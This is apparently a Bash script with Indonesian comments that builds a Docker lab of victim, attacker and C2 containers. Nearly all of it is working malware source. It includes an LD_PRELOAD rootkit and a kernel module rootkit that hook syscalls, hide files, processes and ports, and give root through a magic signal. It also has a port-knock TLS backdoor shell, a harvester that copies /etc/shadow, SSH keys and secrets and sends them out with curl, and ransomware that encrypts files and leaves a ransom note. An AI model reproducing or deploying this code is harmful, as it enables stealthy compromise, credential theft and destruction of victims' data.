#!/usr/bin/env bash
# hxndock.sh — lab Docker untuk hxn. Butuh docker + compose plugin.
# 'up' selalu meregenerasi konteks; edit manual pada hxn-docker/ akan tertimpa.
set -euo pipefail
D="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/hxn-docker"
say(){ printf '\e[1;32m[*]\e[0m %s\n' "$*"; }
die(){ printf '\e[1;31m[x]\e[0m %s\n' "$*" >&2; exit 1; }

gen(){
  local PRIV_BOOL="${PRIV:-false}"
  local LKM_BOOL="${HXN_LKM:-0}"
  case "$PRIV_BOOL" in true|false) ;; *) die "PRIV harus true/false" ;; esac

  mkdir -p "$D/payload" "$D/exfil"
  cd "$D"
  [ -f hxn.key ] || { openssl rand -hex 32 > hxn.key; chmod 600 hxn.key; }

  cat > libhxn.c <<'LEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <limits.h>
#include <sys/stat.h>
#include <sys/types.h>

#define CONF "/etc/hxn.conf"
static char prefix[64] = "hxn";
static char files[32][128]; static int nfiles;
static char pids[32][16];   static int npids;
static unsigned ports[32];  static int nports;
static int loaded;

static void load_conf(void)
{
    FILE *f; char line[256];
    if (loaded) return; loaded = 1;
    f = fopen(CONF, "r"); if (!f) return;
    while (fgets(line, sizeof line, f)) {
        line[strcspn(line, "\r\n")] = 0;
        if (!strncmp(line, "prefix ", 7)) snprintf(prefix, sizeof prefix, "%s", line + 7);
        else if (!strncmp(line, "file ", 5) && nfiles < 32) snprintf(files[nfiles++], 128, "%s", line + 5);
        else if (!strncmp(line, "pid ", 4) && npids < 32) snprintf(pids[npids++], 16, "%s", line + 4);
        else if (!strncmp(line, "port ", 5) && nports < 32) ports[nports++] = (unsigned)atoi(line + 5);
    }
    fclose(f);
}
static const char *base(const char *p){ const char *s = strrchr(p, '/'); return s ? s + 1 : p; }
static int hidden_name(const char *n)
{
    int i; if (!*n) return 0;
    if (!strncmp(n, prefix, strlen(prefix))) return 1;
    for (i = 0; i < nfiles; i++) if (!strcmp(n, files[i])) return 1;
    for (i = 0; i < npids; i++)  if (!strcmp(n, pids[i])) return 1;
    return 0;
}
static int hidden_path(const char *p){ load_conf(); return p && hidden_name(base(p)); }

struct dirent *readdir(DIR *d)
{
    static struct dirent *(*o)(DIR *); struct dirent *e;
    if (!o) o = dlsym(RTLD_NEXT, "readdir");
    while ((e = o(d))) if (!hidden_path(e->d_name)) return e;
    return NULL;
}
struct dirent64 *readdir64(DIR *d)
{
    static struct dirent64 *(*o)(DIR *); struct dirent64 *e;
    if (!o) o = dlsym(RTLD_NEXT, "readdir64");
    while ((e = o(d))) if (!hidden_path(e->d_name)) return e;
    return NULL;
}
#define GUARD(p, r) do { if (hidden_path(p)) { errno = ENOENT; return r; } } while (0)
int __xstat(int v,const char*p,struct stat*b){static int(*o)(int,const char*,struct stat*);if(!o)o=dlsym(RTLD_NEXT,"__xstat");GUARD(p,-1);return o(v,p,b);}
int __lxstat(int v,const char*p,struct stat*b){static int(*o)(int,const char*,struct stat*);if(!o)o=dlsym(RTLD_NEXT,"__lxstat");GUARD(p,-1);return o(v,p,b);}
int __fxstatat(int v,int d,const char*p,struct stat*b,int f){static int(*o)(int,int,const char*,struct stat*,int);if(!o)o=dlsym(RTLD_NEXT,"__fxstatat");GUARD(p,-1);return o(v,d,p,b,f);}
int stat(const char*p,struct stat*b){static int(*o)(const char*,struct stat*);if(!o)o=dlsym(RTLD_NEXT,"stat");GUARD(p,-1);return o(p,b);}
int lstat(const char*p,struct stat*b){static int(*o)(const char*,struct stat*);if(!o)o=dlsym(RTLD_NEXT,"lstat");GUARD(p,-1);return o(p,b);}
int access(const char*p,int m){static int(*o)(const char*,int);if(!o)o=dlsym(RTLD_NEXT,"access");GUARD(p,-1);return o(p,m);}

FILE *fopen(const char *path, const char *mode)
{
    static FILE *(*o)(const char *, const char *);
    char *in = NULL, *out = NULL; size_t il = 0, ic = 0, ol = 0, oc = 0;
    char line[512]; FILE *f;
    if (!o) o = dlsym(RTLD_NEXT, "fopen");
    if (!path || (strcmp(path,"/proc/net/tcp") && strcmp(path,"/proc/net/tcp6"))) return o(path, mode);
    load_conf();
    f = o(path, mode); if (!f) return NULL;
    while (fgets(line, sizeof line, f)) {
        size_t l = strlen(line);
        if (il + l + 1 > ic) { ic = ic ? ic*2 : 8192; in = realloc(in, ic); }
        memcpy(in + il, line, l + 1); il += l;
    }
    fclose(f);
    oc = il + 1; out = malloc(oc);
    for (char *s = in, *nl; s && *s; s = nl) {
        int hide = 0; nl = strchr(s, '\n'); if (nl) *nl++ = 0;
        for (int i = 0; i < nports; i++) {
            char pat[16]; snprintf(pat, sizeof pat, ":%04X", ports[i]);
            char *q = strstr(s, pat);
            if (q && (q[5] == ' ' || q[5] == 0)) { hide = 1; break; }
        }
        if (!hide) {
            size_t l = strlen(s);
            if (ol + l + 2 > oc) { oc = oc*2 + 64; out = realloc(out, oc); }
            memcpy(out + ol, s, l); ol += l; out[ol++] = '\n';
        }
    }
    out[ol] = 0; free(in);
    return fmemopen(out, ol, "r");
}
LEOF

  cat > hxn.c <<'CEOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <linux/seq_file.h>
#include <linux/set_memory.h>
#include <linux/string.h>
#include <asm/ptrace.h>
#include <asm/unistd.h>
#define MAGIC_ROOT_SIG 63
#define MAGIC_UNHIDE_SIG 62
#define MAGIC_PID 31337
static char *hide_prefix = "hxn";
module_param(hide_prefix, charp, 0444);
static int hide_pid[16]; static int n_hide_pid;
module_param_array(hide_pid, int, &n_hide_pid, 0444);
static int hide_port[16]; static int n_hide_port;
module_param_array(hide_port, int, &n_hide_port, 0444);
static unsigned long *sys_call_table;
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static struct seq_operations *tcp4_ops;
static int (*orig_tcp4_show)(struct seq_file *, void *);

static unsigned long lookup_name(const char *n)
{
    struct kprobe kp; unsigned long a = 0;
    memset(&kp, 0, sizeof(kp)); kp.symbol_name = n;
    if (register_kprobe(&kp) == 0) { a = (unsigned long)kp.addr; unregister_kprobe(&kp); }
    return a;
}
static char *fd_path(unsigned int fd)
{
    struct fd f = fdget(fd); char *b, *p;
    if (!f.file) return NULL;
    b = kmalloc(PATH_MAX, GFP_KERNEL);
    if (b) { p = d_path(&f.file->f_path, b, PATH_MAX);
        if (IS_ERR(p)) { kfree(b); b = NULL; } else if (p != b) memmove(b, p, strlen(p)+1); }
    fdput(f); return b;
}
static bool should_hide(const char *path, const char *name)
{
    int i; char b[16];
    if (!strncmp(name, hide_prefix, strlen(hide_prefix))) return true;
    if (!strcmp(name, "hxn.ko") || !strcmp(name, "ld.so.preload")) return true;
    if (path && !strcmp(path, "/proc"))
        for (i = 0; i < n_hide_pid; i++) {
            snprintf(b, sizeof(b), "%d", hide_pid[i]);
            if (!strcmp(name, b)) return true;
        }
    return false;
}
static bool port_hidden(unsigned int p)
{
    int i; for (i = 0; i < n_hide_port; i++) if ((unsigned)hide_port[i] == p) return true;
    return false;
}
static asmlinkage long hook_getdents64(const struct pt_regs *r)
{
    unsigned fd = (unsigned)r->di; void __user *u = (void __user *)r->si;
    long ret, nl = 0; struct linux_dirent64 *k; char *path, *s, *d;
    ret = orig_getdents64(r); if (ret <= 0) return ret;
    k = kzalloc(ret, GFP_KERNEL); if (!k) return ret;
    if (copy_from_user(k, u, ret)) { kfree(k); return ret; }
    path = fd_path(fd); s = (char *)k; d = (char *)k;
    while (s < (char *)k + ret) {
        struct linux_dirent64 *e = (struct linux_dirent64 *)s;
        if (!e->d_reclen) break;
        if (should_hide(path, e->d_name)) { s += e->d_reclen; continue; }
        if (d != s) memmove(d, s, e->d_reclen);
        d += e->d_reclen; nl += e->d_reclen; s += e->d_reclen;
    }
    if (nl != ret) copy_to_user(u, k, nl);
    kfree(path); kfree(k); return nl;
}
static asmlinkage long hook_kill(const struct pt_regs *r)
{
    pid_t pid = (pid_t)r->di; int sig = (int)r->si;
    if (pid == MAGIC_PID) {
        if (sig == MAGIC_ROOT_SIG) { struct cred *c = prepare_kernel_cred(NULL); if (c) { commit_creds(c); return 0; } }
        if (sig == MAGIC_UNHIDE_SIG) { hide_prefix = ""; return 0; }
    }
    return orig_kill(r);
}
static int hook_tcp4_show(struct seq_file *q, void *v)
{
    int old = q->count, ret = orig_tcp4_show(q, v), i;
    char *l, *p, t[8]; unsigned port = 0;
    if (ret || q->count <= old) return ret;
    l = q->buf + old; p = strnstr(l, ":", q->count - old); if (!p) return ret;
    for (i = 0; i < 4 && p[1+i] && p[1+i] != ' '; i++) t[i] = p[1+i];
    t[i] = 0;
    if (kstrtouint(t, 16, &port) == 0 && port_hidden(port)) {
        q->count = old; if (q->from > q->count) q->from = q->count;
    }
    return ret;
}
static void patch_tcp4(void)
{
    struct file *f; struct seq_file *q; unsigned long a;
    f = filp_open("/proc/net/tcp", O_RDONLY, 0); if (IS_ERR(f)) return;
    q = f->private_data; tcp4_ops = (struct seq_operations *)q->op;
    orig_tcp4_show = tcp4_ops->show; a = (unsigned long)&tcp4_ops->show;
    set_memory_rw(a & PAGE_MASK, 1); tcp4_ops->show = hook_tcp4_show;
    filp_close(f, NULL);
}
static void hide_module(void){ list_del(&THIS_MODULE->list); kobject_del(&THIS_MODULE->mkobj.kobj); }
static int __init hxn_init(void)
{
    unsigned long b;
    sys_call_table = (unsigned long *)lookup_name("sys_call_table");
    if (!sys_call_table) return -ENOENT;
    b = (unsigned long)sys_call_table & PAGE_MASK; set_memory_rw(b, 2);
    orig_getdents64 = (void *)sys_call_table[__NR_getdents64];
    orig_kill = (void *)sys_call_table[__NR_kill];
    sys_call_table[__NR_getdents64] = (unsigned long)hook_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)hook_kill;
    patch_tcp4(); hide_module(); pr_info("hxn loaded\n"); return 0;
}
static void __exit hxn_exit(void)
{
    unsigned long b = (unsigned long)sys_call_table & PAGE_MASK;
    unsigned long a = (unsigned long)&tcp4_ops->show;
    set_memory_rw(b, 2);
    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    if (tcp4_ops) { set_memory_rw(a & PAGE_MASK, 1); tcp4_ops->show = orig_tcp4_show; }
}
module_init(hxn_init); module_exit(hxn_exit);
MODULE_LICENSE("GPL"); MODULE_DESCRIPTION("hxn");
CEOF

  printf 'obj-m += hxn.o\nKDIR ?= /lib/modules/$(shell uname -r)/build\nall:\n\t$(MAKE) -C $(KDIR) M=$(PWD) modules\nclean:\n\t$(MAKE) -C $(KDIR) M=$(PWD) clean\n' > Makefile

  cat > payload/hxnd.py <<'PEOF'
#!/usr/bin/env python3
import os, sys, ssl, pty, hmac, time, select, socket, hashlib, subprocess
KEY = open("/etc/hxn.key", "rb").read().strip()
UDP_PORT, TLS_PORT, WINDOW = 62201, 31337, 300
MAGIC = b"KNOCK"
def valid(p):
    if len(p) != 45 or p[:5] != MAGIC: return False
    if abs(time.time() - int.from_bytes(p[5:13], "big")) > 60: return False
    return hmac.compare_digest(p[13:], hmac.new(KEY, p[:13], hashlib.sha256).digest())
def shell(t):
    m, s = pty.openpty()
    subprocess.Popen(["/bin/bash", "-i"], stdin=s, stdout=s, stderr=s, preexec_fn=os.setsid)
    os.close(s)
    while True:
        r, _, _ = select.select([t, m], [], [], 600)
        if not r: break
        if t in r:
            d = t.recv(8192)
            if not d: break
            os.write(m, d)
        if m in r:
            try: d = os.read(m, 8192)
            except OSError: break
            if not d: break
            t.sendall(d)
def listen():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain("/opt/hxn/cert.pem", "/opt/hxn/key.pem")
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", TLS_PORT)); s.listen(1); s.settimeout(WINDOW)
    try:
        c, _ = s.accept(); t = ctx.wrap_socket(c, server_side=True)
        t.sendall(b"hxn ready\n"); shell(t); t.close()
    except Exception: pass
    finally: s.close()
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", UDP_PORT))
    while True:
        p, _ = s.recvfrom(256)
        if valid(p) and os.fork() == 0:
            os.setsid(); listen(); os._exit(0)
if __name__ == "__main__":
    if os.fork(): sys.exit(0)
    os.setsid(); main()
PEOF

  cat > payload/knock.py <<'KEOF'
#!/usr/bin/env python3
import sys, socket, hmac, hashlib, time
k = open(sys.argv[2], "rb").read().strip()
p = b"KNOCK" + int(time.time()).to_bytes(8, "big")
p += hmac.new(k, p, hashlib.sha256).digest()
socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(p, (sys.argv[1], 62201))
print("knock ->", sys.argv[1])
KEOF

  cat > payload/harvest.sh <<'HEOF'
#!/bin/bash
set -u
OUT=/tmp/.hxn.$$; mkdir -p "$OUT"
cp /etc/shadow /etc/passwd "$OUT/" 2>/dev/null
cp /home/*/.ssh/id_* /home/*/.ssh/known_hosts "$OUT/" 2>/dev/null
find /srv /var/data -maxdepth 3 \( -name 'wp-config.php' -o -name '.env' -o -name '*.sql' \) -exec cp {} "$OUT/" \; 2>/dev/null
uname -a > "$OUT/sys.txt"; ip a >> "$OUT/sys.txt" 2>/dev/null; ss -tunap >> "$OUT/sys.txt" 2>/dev/null
tar czf /tmp/.hxn.tgz -C "$OUT" . 2>/dev/null
[ -n "${EXFIL:-}" ] && curl -sk --max-time 20 -F "f=@/tmp/.hxn.tgz" "$EXFIL" >/dev/null 2>&1
echo "[harvest] artefak: $(ls "$OUT" | tr '\n' ' ')"
rm -rf "$OUT" /tmp/.hxn.tgz
HEOF

  cat > payload/lock.py <<'XEOF'
#!/usr/bin/env python3
import os
from concurrent.futures import ThreadPoolExecutor
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

ROOTS = [r for r in os.environ.get("HXN_ROOTS", "/home:/root:/srv").split(":") if os.path.isdir(r)]
SKIP = ("/proc", "/sys", "/dev", "/run", "/boot", "/usr", "/opt/hxn")
EXT = {".txt",".log",".conf",".ini",".yml",".yaml",".json",".xml",".csv",".sql",".db",
       ".pdf",".doc",".docx",".jpg",".png",".zip",".tar",".gz",".bak",".php",".py",".js",".key",".pem"}
HDR = b"HXN1"; count = 0

def walk():
    for r in ROOTS:
        for dp, dn, fn in os.walk(r):
            if any(dp.startswith(s) for s in SKIP): dn[:] = []; continue
            dn[:] = [d for d in dn if not d.startswith(".")]
            for f in fn:
                if os.path.splitext(f)[1].lower() in EXT: yield os.path.join(dp, f)

def encrypt(path, pub):
    global count
    try:
        with open(path, "rb") as fh:
            if fh.read(4) == HDR: return
        data = open(path, "rb").read()
        if not data: return
        key, nonce = os.urandom(32), os.urandom(12)
        ct = AESGCM(key).encrypt(nonce, data, None)
        ek = pub.encrypt(key, padding.OAEP(mgf=padding.MGF1(hashes.SHA256()),
                                           algorithm=hashes.SHA256(), label=None))
        with open(path, "wb") as fh:
            fh.write(HDR + len(ek).to_bytes(2, "big") + ek + nonce + ct)
        count += 1
    except Exception: pass

def main():
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    open("/opt/hxn/ransom_priv.pem", "wb").write(priv.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
    with ThreadPoolExecutor(max_workers=16) as ex:
        for p in walk(): ex.submit(encrypt, p, priv.public_key())
    msg = f"=== HXN ===\n{count} file terenkripsi AES-256-GCM + RSA-2048.\nID: {os.urandom(8).hex()}\n"
    for r in ROOTS:
        try: open(os.path.join(r, "README_HXN.txt"), "w").write(msg)
        except Exception: pass
    print(f"[lock] {count} file")
if __name__ == "__main__": main()
XEOF

  cat > receiver.py <<'REOF'
#!/usr/bin/env python3
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

class H(SimpleHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n)
        name = "upload.bin"
        if b'filename="' in body:
            name = body.split(b'filename="')[1].split(b'"')[0].decode() or name
        name = os.path.basename(name)
        with open(os.path.join("/data", name), "wb") as f:
            f.write(body)
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok\n")

HTTPServer(("0.0.0.0", 8000), H).serve_forever()
REOF

  cat > entrypoint.sh <<'EEOF'
#!/bin/bash
set -u
mkdir -p /opt/hxn
[ -f /etc/hxn.key ] || { openssl rand -hex 32 > /etc/hxn.key; chmod 600 /etc/hxn.key 2>/dev/null; }
[ -f /opt/hxn/key.pem ] || openssl req -x509 -newkey rsa:2048 -nodes -days 3650 \
    -subj "/CN=hxn" -keyout /opt/hxn/key.pem -out /opt/hxn/cert.pem 2>/dev/null
chmod 600 /opt/hxn/key.pem 2>/dev/null

nohup python3 /opt/hxn/hxnd.py >/dev/null 2>&1 &
sleep 1
P=$(pgrep -f hxnd.py | head -1)

printf 'prefix hxn\nfile hxn.ko\nfile ld.so.preload\npid %s\nport 31337\nport 62201\n' "${P:-0}" > /etc/hxn.conf

if LD_PRELOAD=/opt/hxn/libhxn.so ls /opt >/dev/null 2>&1; then
  echo /opt/hxn/libhxn.so > /etc/ld.so.preload
  echo "[hxn] userland rootkit AKTIF"
else
  echo "[hxn] PERINGATAN: libhxn.so gagal dimuat"
fi

if [ "${HXN_LKM:-0}" = "1" ]; then
  if [ -d "/lib/modules/$(uname -r)/build" ]; then
    ( cd /opt/hxn && make >/dev/null 2>&1 && insmod hxn.ko hide_pid="$P" \
        hide_port=31337 hide_port=62201 && echo "[hxn] LKM AKTIF" ) \
      || echo "[hxn] insmod gagal, lanjut tanpa LKM"
  else
    echo "[hxn] header kernel host tidak tersedia, LKM dilewati"
  fi
fi

cat <<'B'
-------------------------------------------------------------
 hxn victim siap.  Uji dari attacker:
   python3 /payload/knock.py victim /etc/hxn.key
   socat - OPENSSL:victim:31337,verify=0
-------------------------------------------------------------
B
exec tail -f /dev/null
EEOF

  cat > Dockerfile <<'DEOF'
FROM debian:bookworm AS build
RUN apt-get update && apt-get install -y --no-install-recommends gcc libc6-dev
WORKDIR /b
COPY libhxn.c .
RUN gcc -shared -fPIC -O2 -o libhxn.so libhxn.c -ldl

FROM debian:bookworm AS base
RUN apt-get update && apt-get install -y --no-install-recommends \
      python3 python3-cryptography openssl socat procps iproute2 curl kmod make gcc libc6-dev \
    && rm -rf /var/lib/apt/lists/*
RUN mkdir -p /opt/hxn /srv/www /var/data /home/dev/.ssh
COPY payload/ /opt/hxn/
COPY hxn.c Makefile entrypoint.sh /opt/hxn/
RUN chmod +x /opt/hxn/*.sh /opt/hxn/*.py
RUN echo '<?php $db_pass="Sup3rS3cret!";' > /srv/www/wp-config.php \
 && echo 'DB_PASS=prod-pass-991' > /srv/www/.env \
 && head -c 4000 /dev/urandom | base64 > /var/data/db_dump.sql \
 && echo 'catatan keuangan Q4' > /var/data/notes.txt \
 && printf -- '-----BEGIN OPENSSH PRIVATE KEY-----\nZmFrZWtleQ==\n-----END OPENSSH PRIVATE KEY-----\n' > /home/dev/.ssh/id_rsa \
 && chmod 600 /home/dev/.ssh/id_rsa \
 && echo 'db1 ssh-ed25519 AAAAfake' > /home/dev/.ssh/known_hosts \
 && echo 'lain-lain' > /opt/readme.txt

FROM base AS victim
COPY --from=build /b/libhxn.so /opt/hxn/libhxn.so
ENTRYPOINT ["/opt/hxn/entrypoint.sh"]

FROM base AS attacker
COPY --from=build /b/libhxn.so /opt/hxn/libhxn.so
CMD ["sleep", "infinity"]
DEOF

  cat > docker-compose.yml <<YEOF
services:

  victim:
    build:
      context: .
      target: victim
    container_name: hxn-victim
    hostname: victim
    privileged: ${PRIV_BOOL}
    ports:
      - "62201:62201/udp"
      - "31337:31337"
    volumes:
      - /lib/modules:/lib/modules:ro
      - ./hxn.key:/etc/hxn.key:ro
    environment:
      HXN_LKM: "${LKM_BOOL}"
      HXN_ROOTS: "/srv:/var/data:/home/dev"
      EXFIL: "http://c2:8000"
    networks:
      - hxnlab

  attacker:
    build:
      context: .
      target: attacker
    container_name: hxn-attacker
    hostname: attacker
    volumes:
      - ./payload:/payload:ro
      - ./hxn.key:/etc/hxn.key:ro
    networks:
      - hxnlab

  c2:
    image: python:3.12-slim
    container_name: hxn-c2
    command: python3 /app/receiver.py
    volumes:
      - ./receiver.py:/app/receiver.py:ro
      - ./exfil:/data
    networks:
      - hxnlab

networks:
  hxnlab:
    driver: bridge
YEOF

  docker compose config -q >/dev/null 2>&1 || die "docker-compose.yml tidak valid"
  say "konteks build siap di $D (PRIV=$PRIV_BOOL, LKM=$LKM_BOOL)"
}

need_docker(){ command -v docker >/dev/null || die "docker tidak terpasang"; docker compose version >/dev/null 2>&1 || die "butuh docker compose plugin"; }

cmd_up(){ need_docker; gen; cd "$D" && docker compose up -d --build; say "lab hidup. masuk: ./hxndock.sh shell"; }
cmd_shell(){ docker exec -it hxn-attacker bash; }
cmd_vshell(){ docker exec -it hxn-victim bash; }
cmd_status(){
  docker exec hxn-victim bash -c '
    echo "--- ls /opt (harus kosong dari hxn)"; ls /opt
    echo "--- proses hxnd terlihat?"; ps aux | grep "[h]xnd" | wc -l
    echo "--- port 31337 terlihat?"; ss -tln | grep -c 31337 || true
    echo "--- ld.so.preload"; cat /etc/ld.so.preload 2>/dev/null'
}
cmd_demo(){
  docker exec hxn-attacker bash -c '
    python3 /payload/knock.py victim /etc/hxn.key && sleep 2
    printf "id; ls /opt; cat /srv/www/.env; exit\n" | socat - OPENSSL:victim:31337,verify=0'
  say "--- exfil diterima C2:"; ls -la "$D/exfil" 2>/dev/null | tail -5 || true
}
cmd_harvest(){ docker exec hxn-victim bash /opt/hxn/harvest.sh; sleep 1; ls -la "$D/exfil" 2>/dev/null | tail -3 || true; }
cmd_lock(){ docker exec hxn-victim python3 /opt/hxn/lock.py; docker exec hxn-victim cat /var/data/README_HXN.txt; }
cmd_check(){ need_docker; gen; cd "$D" && docker compose config; }
cmd_down(){ [ -d "$D" ] && cd "$D" && docker compose down -v || true; }
cmd_nuke(){ cmd_down; rm -rf "$D"; say "dihapus"; }

case "${1:-up}" in
  gen) gen ;;
  up) cmd_up ;;
  shell) cmd_shell ;;
  vshell) cmd_vshell ;;
  status) cmd_status ;;
  demo) cmd_demo ;;
  harvest) cmd_harvest ;;
  lock) cmd_lock ;;
  check) cmd_check ;;
  down) cmd_down ;;
  nuke) cmd_nuke ;;
  *) echo "pakai: $0 {gen|up|shell|vshell|status|demo|harvest|lock|check|down|nuke}"; exit 1 ;;
esac
